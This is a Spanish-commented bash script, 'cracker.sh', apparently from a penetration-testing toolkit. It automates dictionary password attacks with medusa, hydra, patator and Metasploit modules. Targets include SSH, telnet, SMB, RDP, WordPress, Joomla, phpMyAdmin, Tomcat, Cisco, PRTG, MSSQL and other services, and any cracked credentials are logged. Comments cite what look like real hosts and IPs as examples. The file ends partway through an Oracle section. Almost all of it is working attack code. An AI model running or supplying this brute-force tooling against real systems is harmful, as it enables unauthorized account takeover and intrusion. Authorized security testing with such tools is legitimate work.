#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org

OKBLUE='\033[94m'
THREADS="30"
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'

# RDP crak

#admin/admin, admin/password                       

max_ins=10

echo -e '  ______                  _                         __   ______ '
echo -e ' / _____)                | |                       /  | / __   |'
echo -e '| /       ____ ____  ____| |  _ ____  ____    _   /_/ || | //| |'
echo -e '| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |'
echo -e '| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |'
echo -e ' \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ '
echo ''
echo '										version 1.1'
echo '									   daniel.torres@owasp.org'
															
echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"



while getopts ":e:d:t:h:" OPTIONS
do
            case $OPTIONS in
            e)     ENTIDAD=$OPTARG;;
            t)     TYPE=$OPTARG;;
            d)     DICTIONARY=$OPTARG;;            
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

ENTIDAD=${ENTIDAD:=NULL}
DICTIONARY=${DICTIONARY:=NULL}
TYPE=${TYPE:=NULL}

if [[ ${ENTIDAD} = NULL  && ${DICTIONARY} = NULL  ]];then 

cat << "EOF"

Ejecutar el script en el directorio creado por lanscanner (https://github.com/DanielTorres1/lanscanner)

Opciones: 
-e : Nombre de la empresa (Usado para generar diccionario de passwords)
 
-d :Diccionario de passwords a usar (opcional)

Ejemplo 1: Ataque de diccionario con passwords personallizados (basados en la palabra "microsoft") + 20 passwords mas usados
	cracker.sh -e microsoft -t completo

Ejemplo 2: Ataque de diccionario con lista de passwords
	cracker.sh -d passwords.txt -t completo
EOF

exit
fi
######################

#rm enumeracion/* 2>/dev/null
#rm .vulnerabilidades/* 2>/dev/null

if [ $DICTIONARY = NULL ] ; then

	echo $ENTIDAD > base.txt
	passGen.sh -f base.txt -t top200 -o top.txt 
	rm base.txt
	echo "wordpress" >> top.txt	
	echo "joomla" >> top.txt	
	echo "drupal" >> top.txt	
else
	cp $DICTIONARY top.txt	
	#/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
fi



function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files	
	insert-data.py	
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}




### SSH #########
if [ -f servicios/ssh_onlyhost.txt ]
then
	interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P top.txt -h _target_ -M ssh' >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent
	interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "medusa -e n -u root -P top.txt -h _target_ -M ssh >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent
		
fi

			
if [ -f servicios/ssh_onlyhost.txt ]
then
		
	for ip in $(cat servicios/ssh_onlyhost.txt); do			
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_22_passwordAdivinadoServ.txt 2>/dev/null					
	 done	
	insert_data
fi
####################

### Windows
if [ -f servicios/Windows.txt ]
then
	#interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l administrador -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
	#interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l administrador -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
	
	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l administrator -P top.txt -t 1 _target_  smb' >> logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l administrator -P top.txt -t 1 _target_  smb >> logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
	
	#interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l soporte -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
	#interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l soporte -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
	
	#interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l sistemas -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
	#interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l sistemas -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
	
	#interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l $ENTIDAD -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
	#interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l $ENTIDAD -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent		
			
fi

			
if [ -f servicios/Windows.txt ]
then
		
	for ip in $(cat servicios/Windows.txt); do			
		egrep --color=never -i 'login:' logs/cracking/"$ip"_445_passwordAdivinadoWin.txt | tee -a .vulnerabilidades/"$ip"_445_passwordAdivinadoWin.txt
		#https://github.com/m4ll0k/SMBrute (shared)											
	 done	
	 insert_data
fi


### telnet #########
if [ -f servicios/telnet_onlyhost.txt ]
then
	interlace -tL servicios/telnet_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P top.txt -h _target_ -M telnet' >> logs/cracking/_target__23_passwordAdivinadoServ.txt" --silent
	interlace -tL servicios/telnet_onlyhost.txt -threads 10 -c "medusa -e n -u root -P top.txt -h _target_ -M telnet >> logs/cracking/_target__23_passwordAdivinadoServ.txt" --silent
		
fi

			
if [ -f servicios/telnet_onlyhost.txt ]
then
		
	for ip in $(cat servicios/telnet_onlyhost.txt); do			
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_23_passwordAdivinadoServ.txt 2>/dev/null					
	 done	
	insert_data
fi
####################


if [ -f servicios/rdp.txt ]; then	
	for line in $(cat servicios/rdp.txt); do			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t $OKBLUE Encontre servicios de RDP expuestos en $ip:$port $RESET"	  

		# user = administrador
		# patator rdp_login host=$ip user=administrador password=FILE0 0=top.txt  -l logs/cracking/rdp 
		# logFile=`grep OK logs/cracking/rdp/* | head -1| cut -d ":" -f1`		
		# echo "logFile $logFile"
		# if [ -z "$logFile" ]; then
		# 	echo "Upps no se encontro passwords"
		# else
		# 	egrep -iq "OK" $logFile 
		# 	greprc=$?
		# 	if [[ $greprc -eq 0 ]] ; then			
		# 		echo -e "\t[i] Password encontrado"
		# 		# 14:36:32 patator    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
		# 		password=`head -1 $logFile | cut -d " " -f 4 | cut -d : -f2`
		# 		cp $logFile logs/cracking/"$ip"_"$port"_rdpPass.txt 2>/dev/null
		# 		echo "$line (Usuario:administrator Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
		# 	fi
		# fi
		# rm logs/cracking/rdp/* # borrar logs


		

		# user = "nombre entidad"
		# patator rdp_login host=$ip user=$ENTIDAD password=FILE0 0=top.txt -l logs/cracking/rdp2 
		# logFile=`grep OK logs/cracking/rdp2/* | head -1| cut -d ":" -f1`		

		# if [ -z "$logFile" ]; then
		# 	echo "Upps no se encontro passwords"
		# else
		# 	egrep -iq "OK" $logFile 
		# 	greprc=$?
		# 	if [[ $greprc -eq 0 ]] ; then			
		# 		echo -e "\t[i] Password encontrado"
		# 		# 14:36:32 patator    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
		# 		password=`head -1 $logFile | cut -d " " -f 4 | cut -d : -f2`
		# 		cp $logFile logs/cracking/"$ip"_"$port"_rdpPass.txt #2>/dev/null
		# 		echo "$line (Usuario:$ENTIDAD Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
				
		# 	fi
		# fi
		
		

		# user = administrator
		patator rdp_login host=$ip user=administrator password=FILE0 0=top.txt  -l logs/cracking/rdp3
		logFile=`grep OK logs/cracking/rdp3/* | head -1| cut -d ":" -f1`				
		if [ -z "$logFile" ]; then
			echo "Upps no se encontro passwords"
		else

			egrep -iq "OK" $logFile
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t[i] Password encontrado"
				# 14:36:32 patator    INFO - 0     2      1.942 | Cndc2021                           |   123 | OK
				password=`head -1 $logFile | cut -d " " -f 4 | cut -d : -f2`
				echo "$line (Usuario:administrator Password:$password)" >> .vulnerabilidades/"$ip"_"$port"_rdpPass.txt								
				cp $logFile logs/cracking/"$ip"_"$port"_rdpPass.txt 2>/dev/null
			fi
		fi
		rm logs/cracking/rdp3/* # borrar logs

		#https://github.com/m4ll0k/SMBrute (shared)											
	 done	
	 insert_data

fi


IFS=$'\n'  # make newlines the only separator

if [ -f servicios/admin-web.txt ]
then
	  		  
	echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"	
		
	for line in $(cat servicios/admin-web.txt); do	
		
		ip_port_path=`echo $line | cut -d ";" -f 1` #https://www.sanmateo.com.bo:443/wp-login.php
		url=`echo $ip_port_path | sed 's/wp-login.php//'` # https://www.sanmateo.com.bo:443
		fingerprint=`echo $line | cut -d ";" -f 2`
		echo -e "\n\t########### $ip_port_path #######"
		
		ip_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107:80			
		ip=`echo $ip_port | cut -d ":" -f 1`
		port=`echo $ip_port | cut -d ":" -f 2`
		path="/"`echo $ip_port_path | cut -d "/" -f 4` # /wp-login.php
		path=`echo $path | sed 's/wp-login.php//'` #borrar wp-login.php y dejar path como / o /web/
#			echo "webData.pl -t $ip -d $path -p $port -e todo -l /dev/null -r 4 "			
		echo ""
		if [[ $fingerprint = *"wordpress"* ]]; then
			echo -e "\t[+] Wordpress identificado en $ip:$port"
			echo -e "\t[+] Probando contraseñas comunes ...."				
			# 
			if [ -f ".vulnerabilidades2/"$ip"_"$port"_wpUsers.txt" ]; then
				#https://181.115.188.36:443/				
				for user in $(cat .vulnerabilidades2/"$ip"_"$port"_wpUsers.txt | awk '{print $2}'); do
					echo -e "\t\t[+] Probando usuarios identificados. Probando con usuario ($user)"
					#Dominio
					#if [[ ${ip} == *"bo"* || ${ip} == *"com"*  || ${ip} == *"net"* || ${ip} != *"org"* || ${ip} != *"net"* ]];then 
					#	real_ip=`host $ip | grep address |  awk '{print $4}'` # si es dominio, obtenemos su IP
					# login normal							
					wpbrute.sh --url=$url --user=$user --wordlist=top.txt >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
					echo "" >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
					grep -i "The password is" logs/cracking/"$ip"_"$port"_wordpressPass.txt > .vulnerabilidades/"$ip"_"$port"_wordpressPass.txt

					# login xmlrpc
					echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
					msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
									
				done
			else
				echo -e "\t\t[+] Probando con usuario admin"
				#$ip = dominio
					if [[ ${ip} == *"bo"* || ${ip} == *"com"*  || ${ip} == *"net"* || ${ip} != *"org"* || ${ip} != *"net"* ]];then 
						real_ip=`host $ip | head -1 | cut -d " " -f4` 
						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
						msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
					else
						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
						msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
					fi										
			fi						
			grep --color=never 'SUCCESSFUL' logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$ip"_"$port"_wordpressPass.txt 									
		fi	
		
		if [[ $fingerprint = *"phpmyadmin"* ]]; then
			echo -e "\t[+] phpMyAdmin identificado"
			echo "passWeb.pl -t $ip -p $port -m phpmyadmin -d \"/$path/\" -u root|admin|wordpress|joomla|drupal -f top.txt" > logs/cracking/"$ip"_mongo_passwordBD.txt 
			passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u root -f top.txt >> logs/cracking/"$ip"_mongo_passwordBD.txt &
			passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u admin -f top.txt >> logs/cracking/"$ip"_mongo_passwordBD.txt &
			passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u wordpress -f top.txt >> logs/cracking/"$ip"_mongo_passwordBD.txt &
			passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u joomla -f top.txt >> logs/cracking/"$ip"_mongo_passwordBD.txt &
			passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u drupal -f top.txt >> logs/cracking/"$ip"_mongo_passwordBD.txt &
			sleep 5
			######## wait to finish########
			while true; do
				passWeb_instances=$((`ps aux | grep passWeb | wc -l` - 1)) 
				echo "passWeb_instances $passWeb_instances"
				if [ "$passWeb_instances" -gt 0 ]
				then
					echo -e "\t[i] Todavia hay escaneos de passWeb activos ($passWeb_instances)"  
					sleep 30
				else
					break		  		 
				fi				
			done
			##############################

			grep --color=never 'encontrado' logs/cracking/"$ip"_mongo_passwordBD.txt | sort | uniq > .vulnerabilidades/"$ip"_mongo_passwordBD.txt 
		fi	
		
		if [[ $fingerprint = *"joomla"* ]]; then
			echo -e "\t[+] Joomla identificado"
			echo -e "\t[+] Probando contraseñas comunes ...."
			echo "admin" > username.txt
			echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE top.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$ip"_"$port"_joomla.txt
			msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE top.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$ip"_"$port"_joomla.txt 2>/dev/null
			grep --color=never 'Successful login' logs/cracking/"$ip"_"$port"_joomla.txt | sort | uniq > .vulnerabilidades/"$ip"_"$port"_joomla.txt 
			rm username.txt
					
		fi	
					
		if [[ $fingerprint = *"tomcat"* ]]; then
			echo -e "\t[+] Tomcat identificado"							
			echo "patator http_fuzz method=GET url=$ip_port_path  user_pass=tomcat:tomcat -e user_pass:b64 --threads=1" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt	
			patator http_fuzz method=GET url=$ip_port_path  user_pass=tomcat:tomcat -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt	
			egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t[i] Password encontrado"
				# 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`										
				echo "[Tomcat] $ip_port_path (Usuario:tomcat Password:tomcat)" > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt								
			fi
			
			echo "patator http_fuzz method=GET url=$ip_port_path  user_pass=root:root -e user_pass:b64 --threads=1" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
			patator http_fuzz method=GET url=$ip_port_path  user_pass=root:root -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
			egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t[i] Password encontrado"
				# 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`										
				echo "[Tomcat] $ip_port_path (Usuario:root Password:root)" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt								
			fi
			
			#patator http_fuzz method=GET url=$line user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passTomcat.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat.txt
			#si encontro el password											
	
			#patator http_fuzz method=GET url=$line user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat1.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat1.txt				
			#si encontro el password
			#egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat1.txt
			#greprc=$?
			#if [[ $greprc -eq 0 ]] ; then			
				#echo -e "\t[i] Password encontrado"
				## 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
				#echo "$line (Usuario:admin Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
			#fi
											
			
			#patator http_fuzz method=GET url=$line user_pass=manager:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat2.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat2.txt
			#si encontro el password
#				egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat2.txt
			#greprc=$?
			#if [[ $greprc -eq 0 ]] ; then			
				#echo -e "\t[i] Password encontrado"
				## 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
				#echo "$line (Usuario:manager Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
			#fi
			
			#patator http_fuzz method=GET url=$line user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat3.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat3.txt
			#si encontro el password
			#egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat3.txt
			#greprc=$?
			#if [[ $greprc -eq 0 ]] ; then			
				#echo -e "\t[i] Password encontrado"
				## 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
				#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
				#echo "$line (Usuario:root Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
			#fi			
		fi			
	done			
	insert_data
fi

if [ -f servicios/cisco401.txt ]
then	
	
	echo -e "\n\t $OKBLUE Encontre dispositivos CISCO activos. Realizar ataque de passwords ? s/n $RESET"	  
	  		  
	sed -i '1 i\cisco' top.txt	#adicionar password cisco
	echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
	for ip in $(cat servicios/cisco401.txt); do			
		egrep -iq "80/open" .nmap_1000p/"$ip"_tcp.grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "[+] Probando $ip"
			echo "patator http_fuzz method=GET url=\"http://$ip/\" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1" >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
			patator http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_80_passwordAdivinadoServ.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Cisco] Usuario:cisco $respuesta" >> .vulnerabilidades/"$ip"_80_passwordAdivinadoServ.txt
			fi				
		fi
					
	done
	insert_data	 
fi



if [ -f servicios/PRTG.txt ]
then 
	  	
	echo -e "$OKBLUE\n\t#################### Testing PRTG ######################$RESET"	
	sed -i '1 i\prtgadmin' top.txt	#adicionar password prtgadmin
	for line in $(cat servicios/PRTG.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`								
		echo -e "[+] Probando $ip:$port"
		echo "passWeb.pl -t $ip -p $port -d / -m PRTG -u prtgadmin -f top.txt" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
		passWeb.pl -t $ip -p $port -d / -m PRTG -u prtgadmin -f top.txt >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
		grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
		echo ""			
	done
	insert_data

fi

if [ -f servicios/pentaho.txt ]
then

	echo -e "\n\t $OKBLUE Encontre sistemas de Pentaho activos.  $RESET"	  
	  		  
	echo -e "$OKBLUE\n\t#################### Testing Pentahoo ######################$RESET"	
	for line in $(cat servicios/pentaho.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
					
		echo -e "[+] Probando $ip"
		passWeb.pl -t $ip -p $port -d / -m pentaho -u admin -f top.txt  > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
		sleep 2
		grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt | tee -a .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
		
		echo ""			
	done
	insert_data	
fi



if [ -f servicios/web401.txt ]
then     	
      	  
	echo -e "$OKBLUE\n\t#################### Testing pass web (401) ######################$RESET"	
	for line in $(cat servicios/web401.txt); do
		echo -e "[+] Probando $line"			
		
		if [[ ${line} == *"http"*  ]];then 							
			#line = http://200.87.193.109:80/phpmyadmin/
			ip=`echo $line | cut -d ":" -f2 | tr -d "/"`			
			port=`echo $line | cut -d "/" -f 3| cut -d ":" -f2`	
			
			#probar con usuario admin
			patator http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
			fi	
			
			#probar con usuario root
			patator http_fuzz method=GET url="$line" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
			fi
						
		else
			#line=10.0.0.2:80
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			if [[ ${port} == *"443"*  ]];then 	
				#probar con usuario admin
				patator http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt
				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado1.txt`
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then
					echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
				fi	
			
				#probar con usuario root
				patator http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt			
				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port"_passwordAdivinado2.txt`
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then
					echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
				fi
			fi
		fi
							
	done
	insert_data
fi



#falta
if [ -f servicios/ZKSoftware.txt ]
then

	echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
	for line in $(cat servicios/ZKSoftware.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Probando $ip"		
		echo -e "passWeb.pl -t $ip -p $port -m ZKSoftware -u administrator -f top.txt " > logs/cracking/"$ip"_80_passwordZKSoftware.txt
		passWeb.pl -t $ip -p 80 -m ZKSoftware -u administrator -f top.txt >> logs/cracking/"$ip"_80_passwordZKSoftware.txt
		grep --color=never 'encontrado' logs/cracking/"$ip"_80_passwordZKSoftware.txt | tee -a .vulnerabilidades/"$ip"_80_passwordZKSoftware.txt
		echo ""			
	done
	insert_data
	
fi


if [ -f servicios/mssql.txt ]
then

	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
	 for line in $(cat servicios/mssql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Probando $ip"						
		echo "medusa -e n -u sa -P top.txt -h $ip -M mssql" >> logs/cracking/"$ip"_mongo_passwordBD.txt
		medusa -e n -u sa -P top.txt -h $ip -M mssql >> logs/cracking/"$ip"_mongo_passwordBD.txt
		
		echo -e "\n medusa -e n -u adm -P top.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_mongo_passwordBD.txt
		medusa -e n -u adm -P top.txt -h $ip -M mssql >>  logs/cracking/"$ip"_mongo_passwordBD.txt
		
		#echo -e "\n medusa -e n -u $ENTIDAD -P top.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_mongo_passwordBD.txt
		#medusa -e n -u $ENTIDAD -P top.txt -h $ip -M mssql >>  logs/cracking/"$ip"_mongo_passwordBD.txt
		
		grep --color=never SUCCESS logs/cracking/"$ip"_mongo_passwordBD.txt > .vulnerabilidades/"$ip"_mongo_passwordBD.txt
		
	 done	
	 insert_data
fi


if [ -f servicios/oracle.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios oracle activos. $RESET"	   
	
	#https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573  	
				
		export SQLPATH=/opt/oracle/instantclient_18_3
		export TNS_ADMIN=/opt/oracle/instantclient_18_3
		export LD_LIBRARY_PATH=/opt/oracle/instantclient_18_3
		export ORACLE_HOME=/opt/oracle/instantclient_18_3

	 echo -e "$OKBLUE\n\t#################### oracle ######################$RESET"	    
	 for line in $(cat servicios/oracle.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Probando $ip"
